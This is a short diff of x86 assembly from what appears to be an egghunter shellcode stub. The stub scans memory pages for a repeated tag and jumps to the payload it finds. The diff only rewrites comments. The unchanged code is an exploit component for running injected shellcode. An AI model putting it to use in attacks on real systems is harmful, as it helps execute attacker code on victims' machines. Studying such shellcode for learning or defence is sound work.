@@ -17,13 +17,13 @@ inc_addr:
 
 verify_efault:
 	cmp	al, 0xf2	; do we get EFAULT for ecx address?
-	jz	inc_page	; 0 means we got efault in this page. Move the page
+	jz	inc_page	; zero flag means we got efault in this page. Go to the next page
 	
 is_egg:
 	mov	eax, 0x40414243 ; place identifier in eax
 	mov	edi, ecx	; place the address to edi
 	scasd			; eax == edi?
-	jnz	inc_addr	; loop for next address
+	jnz	inc_addr	; not match, go to the next address
 	scasd			; eax == [edi+4]?
-	jnz	inc_addr	; loop for next address
+	jnz	inc_addr	; not match, go to the next address
 	jmp	edi		; egg found!, jump to payload
